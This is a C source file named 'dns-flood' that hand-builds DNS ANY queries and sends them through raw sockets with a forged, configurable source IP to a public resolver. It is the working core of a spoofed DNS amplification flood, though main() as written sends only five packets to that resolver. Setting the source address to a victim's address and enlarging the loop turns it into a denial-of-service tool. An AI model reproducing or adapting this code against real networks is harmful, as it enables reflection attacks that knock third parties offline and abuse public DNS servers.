//
//  main.c
//  dns-flood
//
//  Created by Euphie  on 2018/10/30.
//  Copyright © 2018年 Euphie . All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DNS_NAME "qq.com"
#define SOURCE_IP "10.0.8.97"
#define DNS_SERVER "114.114.114.114"

// DNS头部
typedef struct
{
    unsigned short id;
    unsigned short flags;
    unsigned short qcount;
    unsigned short ans;
    unsigned short auth;
    unsigned short add;
} DNS_HEADER;

// DNS查询，其实一个QUESTION前面还包含了qname
typedef struct
{
    unsigned short qtype;
    unsigned short qclass;
} DNS_QUESTION;

// IP伪头，用来计算校验和
typedef struct
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
} PSEUDO_HEADER;

// 创建一个DNS头部
void create_dns_header(DNS_HEADER* dns)
{
    dns->id = (unsigned short) htons(getpid());
    dns->flags = htons(0x0100);
    dns->qcount = htons(1);
    dns->ans = 0;
    dns->auth = 0;
    dns->add = 0;
}

// www.google.com会变成3www6google3com
void format_dns_name(char* format, char* host)
{
    int lock = 0 , i;
    strcat((char*)host,".");
    
    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *format++ = i-lock;
            for(;lock<i;lock++)
            {
                *format++=host[lock];
            }
            lock++;
        }
    }
    *format++='\0';
}

// 计算校验和
unsigned short calculate_checksum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
    
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
    
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    
    return(answer);
}

//4.1.1. Header section format
//
//The header contains the following fields:
//
//1  1  1  1  1  1
//0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                      ID                       |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                    QDCOUNT                    |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                    ANCOUNT                    |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                    NSCOUNT                    |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                    ARCOUNT                    |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

//4.1.2. Question section format
//
//The question section is used to carry the "question" in most queries,
//i.e., the parameters that define what is being asked.  The section
//contains QDCOUNT (usually 1) entries, each of the following format:
//
//1  1  1  1  1  1
//0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                                               |
///                     QNAME                     /
///                                               /
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                     QTYPE                     |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
//|                     QCLASS                    |
//+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
void create_dns_data(char* dns_data, unsigned long* dns_data_len) {
    // 设置DNS头部
    DNS_HEADER* dns_header; // DNS头部
    dns_header = (DNS_HEADER*)dns_data;
    create_dns_header(dns_header);
    
    // 设置DNS查询，一个查询包含qname、qtype和qclass
    char* qname; // qname
    char dns_name[100] = DNS_NAME;
    qname =(char*)&dns_data[sizeof(DNS_HEADER)];
    format_dns_name(qname, dns_name);
    DNS_QUESTION* dns_question; // qtype和qclass
    dns_question =(DNS_QUESTION*)&dns_data[sizeof(DNS_HEADER) + (strlen((const char*)qname) + 1)];
    dns_question->qtype = htons(255);
    dns_question->qclass = htons(1);
    
    *dns_data_len = sizeof(DNS_HEADER) + (strlen((const char*)qname) + 1) + sizeof(DNS_QUESTION);
}

// 通过UDP发送DNS查询
void query_with_udp_packet() {
    // 创建DNS报文
    char dns_data[1000];
    unsigned long dns_data_len;
    create_dns_data(dns_data, &dns_data_len);
    
    // 准备查询
    int fd;
    struct sockaddr_in dest;
    fd = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP);
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(DNS_SERVER); //dns servers
    
    if( sendto(fd, (char*)dns_data, dns_data_len , 0 ,(struct sockaddr*)&dest,sizeof(dest)) < 0)
    {
        perror("sendto failed\n");
    }
}

// 通过原始报文发送DNS查询
void query_with_raw_packet() {
    // 数据报文的结构：IP头（20字节）+UDP头（8字节）+DNS报文
    char datagram[4096];

    // 定义一个IP头指针指向报文
    struct ip *ip_header = (struct ip*) datagram;
    
    // 创建DNS报文
    char dns_data[1000];
    unsigned long dns_data_len;
    create_dns_data(dns_data, &dns_data_len);
    memcpy(datagram + sizeof (struct ip) + sizeof(struct udphdr), dns_data, dns_data_len);
    
    // 定义一个UDP头指针指向UDP报文位置，并设置UDP头
    struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof (struct ip));
    udp_header->uh_dport = htons(53);
    udp_header->uh_sport = htons(9999);
    udp_header->uh_ulen = htons(sizeof(struct udphdr) + dns_data_len);
    udp_header->uh_sum = 0;
    
    // 目标地址结构
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(DNS_SERVER);
    
    // 开始设置IP头
    char source_ip[32];
    strcpy(source_ip, SOURCE_IP);
    ip_header->ip_hl = 5;
    ip_header->ip_v = IPVERSION;
    ip_header->ip_tos = IPTOS_PREC_ROUTINE;
    ip_header->ip_len = sizeof (struct ip) + sizeof(struct udphdr) + dns_data_len;
    ip_header->ip_id = htons(getpid());
    ip_header->ip_off = 0;
    ip_header->ip_ttl = MAXTTL;
    ip_header->ip_p = IPPROTO_UDP;
    ip_header->ip_src.s_addr = inet_addr (source_ip);
    ip_header->ip_dst.s_addr = dest.sin_addr.s_addr;
    ip_header->ip_sum = calculate_checksum((unsigned short *) datagram, ip_header->ip_len);
    
    // 计算UDP校验和
    PSEUDO_HEADER psd_header;
    psd_header.source_address = ip_header->ip_src.s_addr;
    psd_header.dest_address =  ip_header->ip_dst.s_addr;
    psd_header.placeholder = 0;
    psd_header.protocol = IPPROTO_UDP;
    psd_header.udp_length = htons(sizeof(struct udphdr) + dns_data_len);
    
    int psize = (int)(sizeof(PSEUDO_HEADER) + sizeof(struct udphdr) + dns_data_len);
    char* psd_data;
    psd_data = malloc(psize);
    memcpy(psd_data , (char*) &psd_header , sizeof ( PSEUDO_HEADER));
    memcpy(psd_data + sizeof( PSEUDO_HEADER) , udp_header , sizeof(struct udphdr) + dns_data_len);
    udp_header->uh_sum = calculate_checksum((unsigned short*) psd_data , psize);
    
    int s;
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
       perror("socket failed.\n");
    }
    
    const int on = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt failed.\n");
    }
    
    if (sendto (s, datagram, ip_header->ip_len ,  0, (struct sockaddr *) &dest, sizeof (dest)) < 0)
    {
        perror("sendto failed.\n");
    }
}

int main() {
    // query_with_udp_packet();
    int i;
    for(i=0; i< 5; i++) {
        query_with_raw_packet();
        sleep(2);
    }

    printf("done.\n");
}

